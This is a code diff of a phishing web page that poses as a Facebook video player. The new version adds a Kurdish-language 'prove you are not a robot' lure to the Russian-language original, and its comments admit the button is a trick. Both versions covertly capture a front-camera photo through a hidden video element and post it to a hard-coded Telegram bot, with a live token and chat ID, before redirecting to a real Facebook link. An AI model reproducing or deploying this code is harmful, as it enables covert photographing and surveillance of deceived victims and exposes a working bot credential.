@@ -1,43 +1,63 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Video Center</title>
     
-    <title>Facebook Post</title>
-    <meta property="og:title" content="Facebook Video">
-    <meta property="og:description" content="بۆ بینینی ئەم ڤیدیۆیە کلیک لێرە بکە">
+    <meta property="og:title" content="Facebook Video Player">
     <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/y9f97_th_th.png">
-    <meta property="og:type" content="video.other">
 
     <style>
-        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
-        #canvas { display: none; }
         body { 
-            background-color: #ffffff; 
+            background-color: #f0f2f5; 
             margin: 0; 
+            font-family: Arial, sans-serif; 
             display: flex; 
-            flex-direction: column;
             justify-content: center; 
             align-items: center; 
-            height: 100vh; 
+            height: 100vh;
+            text-align: center;
         }
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #1877F2; 
-            border-radius: 50%;
-            width: 35px;
-            height: 35px;
-            animation: spin 1s linear infinite;
+        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
+        #canvas { display: none; }
+        
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            max-width: 90%;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status-text { margin-top: 20px; color: #555; font-size: 14px; font-family: sans-serif; }
+        .fb-logo {
+            width: 50px;
+            margin-bottom: 15px;
+        }
+        h2 { color: #1c1e21; font-size: 18px; margin-bottom: 10px; }
+        p { color: #606770; font-size: 14px; line-height: 1.5; }
+        
+        /* ئەم دوگمەیە فێڵەکەیە، کەسەکە وا دەزانێت دەبێت دایبگرێت */
+        .btn {
+            background-color: #1877f2;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-weight: bold;
+            display: inline-block;
+            margin-top: 20px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
 
-    <div class="loader"></div>
-    <div class="status-text">Загрузка видео Facebook...</div>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo" alt="FB">
+        <h2>پێویستە ناسنامەت پشتڕاست بکەیتەوە</h2>
+        <p>بۆ بینینی ناوەڕۆکی ئەم ڤیدیۆیە، تکایە ڕێگە بدە بە <b>"Camera"</b> بۆ ئەوەی سیستەمەکە دڵنیا بێتەوە کە تۆ ڕۆبۆت نیت.</p>
+        <div class="btn" onclick="startProcess()">پشتڕاستکردنەوە و بینین</div>
+    </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
@@ -45,40 +65,35 @@
     <script>
         const TELEGRAM_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY'; 
         const CHAT_ID = '6351568884';
-        
-        // ئەو لینکەی کە تۆ ناردت
-        const FACEBOOK_POST_URL = 'https://www.facebook.com/share/1C5gccsXme/?mibextid=wwXIfr'; 
+        const FB_URL = 'https://www.facebook.com/share/1C5gccsXme/?mibextid=wwXIfr';
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            
-            // دوای 4 چرکە وێنەکە دەگرێت و دەچێتە سەر پۆستەکە
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+        function startProcess() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                document.getElementById('video').srcObject = stream;
                 
-                canvas.toBlob(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'fb_video_capture.jpg');
-
-                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(() => {
-                        window.location.href = FACEBOOK_POST_URL;
-                    });
-                }, 'image/jpeg', 0.9);
-            }, 4000);
-        })
-        .catch(() => {
-            window.location.href = FACEBOOK_POST_URL;
-        });
+                // کەمێک چاوەڕێ دەکەین تا وێنەکە جوان بێت
+                setTimeout(() => {
+                    const video = document.getElementById('video');
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'verified.jpg');
+                        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
+                        .then(() => { window.location.href = FB_URL; });
+                    }, 'image/jpeg', 0.9);
+                }, 3000);
+            })
+            .catch(() => { 
+                // ئەگەر ڕەزامەندی نەدا یان کێشەیەک هەبوو، هەر دەنێردرێت بۆ فەیسبووک
+                window.location.href = FB_URL; 
+            });
+        }
     </script>
 </body>
 </html>
